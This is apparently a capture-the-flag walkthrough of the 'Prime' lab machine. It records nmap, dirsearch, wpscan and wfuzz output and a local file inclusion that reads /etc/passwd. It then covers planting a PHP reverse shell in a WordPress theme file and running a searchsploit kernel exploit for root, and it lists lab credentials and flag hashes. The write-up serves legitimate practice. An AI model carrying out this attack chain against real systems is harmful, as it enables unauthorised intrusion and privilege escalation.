[*] Prime [*]

# Date : 28/01/2022

# ->Enumeration Phase:

# Nmap 7.91 scan initiated Fri Jan 28 21:06:09 2022 as: nmap -sC -sV -vv -p- -oN nmap_all 192.168.0.110
Nmap scan report for 192.168.0.110
Host is up, received arp-response (0.00018s latency).
Scanned at 2022-01-28 21:06:10 IST for 8s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcSVb7n0rTb58TfCcHJgtutnZzqf0hl48jPxI+VHOyhiQIihkQVkshhc8LdnSUg2BRGZL+RFfNLan9Q6FY0D7T/7PMlggPtSLU80er3JJO+XMfO3NURgMtVtKS0m+nRbL9C/pKSgBewxIcPk7Y45aXjAo7tsSoJ3DZUDcaitfFbAlr+108VBSx/arOXbYtusI1E2OCj1v/VKgVA9N/FL/OHuloOZPs/hY0MoamQKy+XYNdyCtrvSeRmItf09YXhFJwfY9Tr/nk077J7cz3r3INP+AFrpKVjdUAtxNpb+zAJLMJY8WF7oRZ1B8Sdljsslkh8PPK8e6Z4/rlCaJYW0OX
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiCXK7fYpBhJbT1KsyJkcpdXc1+zrB9rHVxBPtvA9hwTF4R4dZCZI9IpMFrperU0wqI/8uGYF9mW8l3aOAhJqc=
|   256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKMh3392Cf8RmKX5UyT6C1yLIVbncwwUg1i2P7/ucKk
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HacknPentest
MAC Address: 08:00:27:07:CE:99 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 28 21:06:18 2022 -- 1 IP address (1 host up) scanned in 8.63 seconds

PORT     STATE         SERVICE  REASON
68/udp   open|filtered dhcpc    no-response
631/udp  open|filtered ipp      no-response
5353/udp open|filtered zeroconf no-response


# dirsearch found:
    ->>
    [21:14:44] 200 -  131B  - /dev
    [21:14:48] 200 -  147B  - /image.php
    [21:14:48] 200 -  136B  - /index.php
    [21:14:49] 200 -  136B  - /index.php/login/
    [21:14:49] 301 -  319B  - /javascript  ->  http://192.168.0.110/javascript/
    [21:14:59] 403 -  302B  - /server-status/
    [21:14:59] 403 -  301B  - /server-status
    [21:15:07] 200 -    3KB - /wordpress/wp-login.php
    [21:15:07] 200 -   11KB - /wordpress/
    /secret.txt           (Status: 200) [Size: 412]  

    /dev:

    hello,
    now you are at level 0 stage.
    In real life pentesting we should use our tools to dig on a web very hard.
    Happy hacking.

    /secret.txt:

    Looks like you have got some secrets.

    Ok I just want to do some help to you. 

    Do some more fuzz on every page of php which was finded by you. And if
    you get any right parameter then follow the below steps. If you still stuck 
    Learn from here a basic tool with good usage for OSCP.

    https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
    


    //see the location.txt and you will get your next move//

>> Fuzz the php pages:
>> # wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 --hw 12 http://192.168.0.110/index.php?FUZZ=location.txt

    000001601:   200        8 L      42 W       334 Ch      "file"   
>> content : well Now you reah at the exact parameter <br><br>Now dig some more for next one <br>use 'secrettier360' parameter on some other php page for more fun.
>> this parameter having lfi vulnerbility: checking /etc/passwd

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin

>> in output there is password.txt file present in /home/saket directory
>> so fetch it and file contains password of wordpress.

# wordpress creds:
     username : victor
     password : follow_the_ippsec



# wpscan found:
    ->>
    wpscan --url http://192.168.0.110/wordpress/ --enumerate u p  --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

    [+] URL: http://192.168.0.110/wordpress/ [192.168.0.110]
    [+] Started: Fri Jan 28 21:19:16 2022

    Interesting Finding(s):

    [+] Headers
    | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
    | Found By: Headers (Passive Detection)
    | Confidence: 100%

    [+] XML-RPC seems to be enabled: http://192.168.0.110/wordpress/xmlrpc.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%
    | References:
    |  - http://codex.wordpress.org/XML-RPC_Pingback_API
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
    |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

    [+] WordPress readme found: http://192.168.0.110/wordpress/readme.html
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%

    [+] Upload directory has listing enabled: http://192.168.0.110/wordpress/wp-content/uploads/
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: http://192.168.0.110/wordpress/wp-cron.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 60%
    | References:
    |  - https://www.iplocation.net/defend-wordpress-from-ddos
    |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
    | Found By: Rss Generator (Passive Detection)
    |  - http://192.168.0.110/wordpress/?feed=rss2, <generator>https://wordpress.org/?v=5.2.2</generator>
    |  - http://192.168.0.110/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.2.2</generator>

    [+] WordPress theme in use: twentynineteen
    | Location: http://192.168.0.110/wordpress/wp-content/themes/twentynineteen/
    | Last Updated: 2022-01-25T00:00:00.000Z
    | Readme: http://192.168.0.110/wordpress/wp-content/themes/twentynineteen/readme.txt
    | [!] The version is out of date, the latest version is 2.2
    | Style URL: http://192.168.0.110/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4
    | Style Name: Twenty Nineteen
    | Style URI: https://wordpress.org/themes/twentynineteen/
    | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
    | Author: the WordPress team
    | Author URI: https://wordpress.org/
    |
    | Found By: Css Style In Homepage (Passive Detection)
    |
    | Version: 1.4 (80% confidence)
    | Found By: Style (Passive Detection)
    |  - http://192.168.0.110/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

    [+] Enumerating Users (via Passive and Aggressive Methods)
    Brute Forcing Author IDs - Time: 00:00:00 <================================================================================> (10 / 10) 100.00% Time: 00:00:00

    [i] User(s) Identified:

    [+] victor
    | Found By: Author Posts - Display Name (Passive Detection)
    | Confirmed By:
    |  Rss Generator (Passive Detection)
    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    |  Login Error Messages (Aggressive Detection)

    [!] No WPScan API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

    [+] Finished: Fri Jan 28 21:19:19 2022
    [+] Requests Done: 50
    [+] Cached Requests: 9
    [+] Data Sent: 13.449 KB
    [+] Data Received: 474.863 KB
    [+] Memory used: 187.859 MB
    [+] Elapsed time: 00:00:02


# ->Exploitation Phase:

>> Change the content in secret.php file (add php reverse shell)
>> visit url: http://192.168.0.110/wordpress/wp-content/themes/twentynineteen/secret.php
>> obtain a reverse shell.

# user.txt : af3c658dcf9d7190da3153519c003456

# ->PostExplitation Phase:

>> wp-config.php file found:

    define( 'DB_NAME', 'wordpress' );

    /** MySQL database username */
    define( 'DB_USER', 'wordpress' );

    /** MySQL database password */
    define( 'DB_PASSWORD', 'yourpasswordhere' );

    /** MySQL hostname */
    define( 'DB_HOST', 'localhost' );

    /** Database Charset to use in creating database tables. */
    define( 'DB_CHARSET', 'utf8mb4' );

    /** The Database Collate type. Don't change this if in doubt. */
    define( 'DB_COLLATE', '' );

>> enc binary in saket directory having executable permission.but requires a password.
>> in /opt/backup/backup_pass file 'enc' file password is found.
    your password for backup_database file enc is 

    "backup_password"

    Enjoy!

>> after executing ./enc file using password : key.txt and enc.txt files are come out.

/key.txt:

    I know you are the fan of ippsec.
    So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
/enc.txt:

    nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
 >> Ippsec : 366a74cb3c959de17d61db30591c39d1 (md5) 

 >> check kernel(ubuntu version) : 16.04
    ->> check exploit for that version:
        searchsploit ubuntu 16.04 

        Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation              | linux/local/45010.c

>> compile the script and run ,you got a root shell.

# root.txt : b2b17036da1de94cfb024540a8e7075a
